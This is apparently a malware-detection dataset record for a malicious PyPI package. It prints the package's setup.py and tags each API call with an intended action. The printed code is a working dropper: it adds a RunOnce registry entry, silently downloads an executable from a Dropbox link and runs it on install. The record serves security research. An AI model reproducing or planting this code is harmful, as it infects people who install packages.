{
  "metadata": {
    "package_name": "191239aa-10.87",
    "report_path": "/home2/blue/Documents/PyPIAgent/Codes/tooldetect/detect_output/guarddog/malware/191239aa-10.87.txt",
    "original_json_path": "/home2/blue/Documents/PyPIAgent/Codes/code_contexral/codesnippets/malware/191239aa-10.87.json",
    "dataset_type": "malware"
  },
  "code_files": [
    {
      "pyfile": "setup.py",
      "code_snippets": [
        {
          "snippet": "import os\nimport subprocess\n\nif os.getlogin() != \"Tahg\":\n  malwPath = os.environ['TEMP'] + \"\\\\temp-PipInstall.exe\"\n  try:\n    cPath = os.environ['WINDIR'] + \"\\\\System32\\\\curl.exe\"\n    subprocess.Popen(f'reg add \"HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\RunOnce\" /v Pentestlab /t REG_SZ /d \"{malwPath}\"', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\n    subprocess.call([cPath, \"https://dl.dropboxusercontent.com/s/5mp5s3ta5skt5rv/esqueleDrp.exe?dl=0\", \"-o\", malwPath], shell=False, creationflags=subprocess.CREATE_NO_WINDOW).wait()\n    os.system(malwPath)\n  except: pass",
          "triple_sequences": [
            {
              "action_api": "os.getlogin()",
              "action_description": "Retrieves current user login name",
              "action_id": "get_username",
              "object": "",
              "object_description": "Current username",
              "object_id": "current_username",
              "intention_description": "Access current username",
              "intention_id": "access_current_username"
            },
            {
              "action_api": "os.environ['TEMP']",
              "action_description": "Retrieves value of environment variable",
              "action_id": "get_env_var",
              "object": "TEMP",
              "object_description": "Environment variable",
              "object_id": "environment_variable",
              "intention_description": "Collect environment variable",
              "intention_id": "collect_environment_variable"
            },
            {
              "action_api": "os.environ['WINDIR']",
              "action_description": "Retrieves value of environment variable",
              "action_id": "get_env_var",
              "object": "WINDIR",
              "object_description": "Environment variable",
              "object_id": "environment_variable",
              "intention_description": "Collect environment variable",
              "intention_id": "collect_environment_variable"
            },
            {
              "action_api": "subprocess.Popen()",
              "action_description": "Spawns new process to execute command without shell access",
              "action_id": "spawn_process_no_shell",
              "object": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\" /v Pentestlab /t REG_SZ /d \"{malwPath}\"",
              "object_description": "Shell command",
              "object_id": "shell_command",
              "intention_description": "Add registry value for startup",
              "intention_id": "add_startup_registry_entry"
            },
            {
              "action_api": "subprocess.call()",
              "action_description": "Spawns new process to execute command without shell access",
              "action_id": "spawn_process_no_shell",
              "object": "[cPath, \"https://dl.dropboxusercontent.com/s/5mp5s3ta5skt5rv/esqueleDrp.exe?dl=0\", \"-o\", malwPath]",
              "object_description": "Shell command",
              "object_id": "shell_command",
              "intention_description": "Download remote content",
              "intention_id": "download_remote_content"
            },
            {
              "action_api": "os.system()",
              "action_description": "Executes shell command",
              "action_id": "execute_shell_command",
              "object": "malwPath",
              "object_description": "Executable file",
              "object_id": "executable_file",
              "intention_description": "Execute file",
              "intention_id": "execute_file"
            }
          ]
        }
      ]
    }
  ]
}